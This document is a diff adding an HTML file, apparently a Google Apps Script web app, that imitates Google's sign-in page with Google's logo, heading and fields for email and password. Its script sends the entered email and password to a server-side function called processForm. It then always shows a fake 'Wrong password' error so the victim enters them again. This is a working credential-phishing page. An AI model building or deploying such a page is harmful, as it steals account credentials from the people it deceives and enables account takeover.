@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <base target="_top">
+  <style>
+    * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    body { 
+      display: flex; justify-content: center; align-items: center; 
+      min-height: 100vh; margin: 0; background-color: #fff; 
+    }
+    .container {
+      width: 450px; max-width: 100%; padding: 48px 40px 36px;
+      border: 1px solid #dadce0; border-radius: 8px;
+      display: flex; flex-direction: column;
+    }
+    .logo { text-align: center; margin-bottom: 16px; }
+    .title { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin: 0 0 10px; }
+    .subtitle { font-size: 16px; text-align: center; color: #202124; margin-bottom: 40px; }
+    
+    .input-box { position: relative; margin-bottom: 24px; width: 100%; }
+    .input-box input {
+      width: 100%; padding: 13px 15px; font-size: 16px; color: #202124;
+      border: 1px solid #dadce0; border-radius: 4px; background: transparent;
+      outline: none; transition: border 0.2s;
+    }
+    .input-box input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+    .input-box label {
+      position: absolute; left: 12px; top: 14px; padding: 0 4px; font-size: 16px;
+      color: #5f6368; background: #fff; transition: 0.2s; pointer-events: none;
+    }
+    .input-box input:focus ~ label,
+    .input-box input:not(:placeholder-shown) ~ label {
+      top: -8px; font-size: 12px; color: #1a73e8; font-weight: 500;
+    }
+
+    .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 36px; }
+    .actions a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
+    .actions button {
+      background: #1a73e8; color: #fff; border: none; border-radius: 4px;
+      padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer;
+    }
+    
+    .error { color: #d93025; font-size: 14px; margin-top: 15px; display: none; align-items: center; }
+    .error svg { width: 16px; height: 16px; margin-right: 8px; fill: #d93025; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+  </div>
+  
+  <h1 class="title">Sign in</h1>
+  <div class="subtitle">Use your Google Account</div>
+
+  <form id="loginForm" onsubmit="submitForm(event)">
+    <div class="input-box">
+      <input type="email" id="email" required placeholder=" ">
+      <label>Email or phone</label>
+    </div>
+    
+    <div class="input-box">
+      <input type="password" id="password" required placeholder=" ">
+      <label>Enter your password</label>
+    </div>
+
+    <div id="errBox" class="error">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+      <span>Wrong password. Try again or click Forgot password to reset it.</span>
+    </div>
+
+    <div class="actions">
+      <a href="#">Forgot password?</a>
+      <button type="submit" id="btn">Next</button>
+    </div>
+  </form>
+</div>
+
+<script>
+  function submitForm(e) {
+    e.preventDefault();
+    var btn = document.getElementById('btn');
+    var errBox = document.getElementById('errBox');
+    btn.disabled = true;
+    btn.innerText = 'Checking...';
+
+    var email = document.getElementById('email').value;
+    var pass = document.getElementById('password').value;
+
+    google.script.run
+      .withSuccessHandler(function() {
+        errBox.style.display = 'flex';
+        btn.disabled = false;
+        btn.innerText = 'Next';
+        document.getElementById('password').value = '';
+      })
+      .withFailureHandler(function() {
+        btn.disabled = false;
+        btn.innerText = 'Next';
+      })
+      .processForm(email, pass);
+  }
+</script>
+
+</body>
+</html>
